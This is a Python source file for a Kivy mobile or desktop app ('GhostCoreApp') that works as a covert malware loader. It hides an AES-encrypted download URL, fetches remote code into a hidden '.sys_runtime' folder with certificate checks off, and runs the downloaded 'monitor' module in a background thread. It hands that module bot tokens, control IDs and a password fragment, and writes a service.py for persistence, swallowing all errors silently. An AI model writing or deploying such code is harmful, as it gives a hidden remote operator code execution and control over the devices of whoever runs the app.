# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import importlib.util
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
ENCRYPTED_INDEX_URL_BLOB = "MJilpSkjw5UIB3TqHWoAwwCnT43B2loY7Y/5nh4oiO7uQtOgORznWJPTa/1tCcikgAW5lu+TRTFWndV19NhPECwWMCa3bG5+46mFFmp5Ud7EKKis3cQ12YOPoJZYCSfVNQWT4+txaBqUKI+M/wxNIKWN7xlelOTrxdTbvcZeI3snglX7NIR5GR6f0w=="
ADMIN_PASS_PART3_ENC = "QDEyM0A="

def decrypt_data(encrypted_blob, retries=3):
    for attempt in range(retries):
        try:
            data = base64.b64decode(encrypted_blob)
            iv, tag, ciphertext = data[:12], data[12:28], data[28:]
            cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
        except:
            if attempt < retries - 1:
                time.sleep(1)
    return None

def get_admin_password_part3():
    return base64.b64decode(ADMIN_PASS_PART3_ENC).decode()

BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
sys.path.append(BASE_DIR)

try:
    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID
except ImportError:
    BOT_TOKENS = ["YOUR_BOT_TOKEN"]
    CONTROL_ID = "YOUR_CONTROL_ID"
    VAULT_ID = "YOUR_VAULT_ID"

class GhostCoreApp(App):
    def build(self):
        self.prepare_service_file()
        root = BoxLayout(orientation='vertical', padding=5)
        self.console = TextInput(
            text="[System]\n",
            readonly=True, background_color=(0,0,0,1), foreground_color=(0,1,0,1), font_size='11sp'
        )
        root.add_widget(self.console)
        Clock.schedule_once(self.run_engine, 0.5)
        return root

    def add_log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        entry = f"[{timestamp}] {msg}"
        if hasattr(self, 'console') and self.console:
            self.console.text += entry + "\n"

    def prepare_service_file(self):
        try:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            part3 = get_admin_password_part3()
            service_code = f'''
import os
import sys
import time
current_dir = r"{current_dir}"
base_dir = os.path.join(current_dir, ".sys_runtime")
sys.path.append(base_dir)
os.environ['PYTHONPATH'] = base_dir + os.pathsep + os.environ.get('PYTHONPATH', '')
def start_bg():
    try:
        from monitor import Monitor
        import threading
        mon = Monitor()
        mon.admin_password_part3 = "{part3}"
        mon.bot_token = "{BOT_TOKENS[0]}"
        mon.control_id = "{CONTROL_ID}"
        mon.vault_id = "{VAULT_ID}"
        mon.bot_tokens = {BOT_TOKENS}
        threading.Thread(target=mon.start, daemon=True).start()
    except Exception as e:
        with open(os.path.join(base_dir, "svc_err.log"), "a") as f:
            f.write(str(e) + "\\n")
if __name__ == '__main__':
    start_bg()
    while True:
        time.sleep(60)
'''
            with open("service.py", "w", encoding="utf-8") as f:
                f.write(service_code)
        except:
            pass

    def download_payloads(self):
        index_url = decrypt_data(ENCRYPTED_INDEX_URL_BLOB)
        if not index_url or not index_url.startswith('http'):
            return
        for attempt in range(3):
            try:
                resp = requests.get(index_url, timeout=20, verify=False)
                if resp.status_code == 200:
                    index_data = json.loads(resp.text)
                    file_urls = index_data.get('files', [])
                    for url in file_urls:
                        name = url.split('/')[-1]
                        r = requests.get(url, timeout=15, verify=False)
                        if r.status_code == 200:
                            with open(os.path.join(BASE_DIR, name), 'w', encoding='utf-8') as f:
                                f.write(r.text)
                    break
            except:
                time.sleep(5)

    def start_services(self):
        try:
            monitor_path = os.path.join(BASE_DIR, "monitor.py")
            if not os.path.exists(monitor_path):
                return
            spec = importlib.util.spec_from_file_location("monitor", monitor_path)
            module = importlib.util.module_from_spec(spec)
            sys.modules["monitor"] = module
            spec.loader.exec_module(module)
            if hasattr(module, 'Monitor'):
                mon = module.Monitor()
                mon.admin_password_part3 = get_admin_password_part3()
                mon.bot_token = BOT_TOKENS[0]
                mon.control_id = CONTROL_ID
                mon.vault_id = VAULT_ID
                mon.bot_tokens = BOT_TOKENS
                threading.Thread(target=mon.start, daemon=True).start()
        except:
            pass

    def run_engine(self, dt):
        threading.Thread(target=self._full_flow, daemon=True).start()

    def _full_flow(self):
        self.download_payloads()
        self.start_services()

if __name__ == '__main__':
    GhostCoreApp().run()
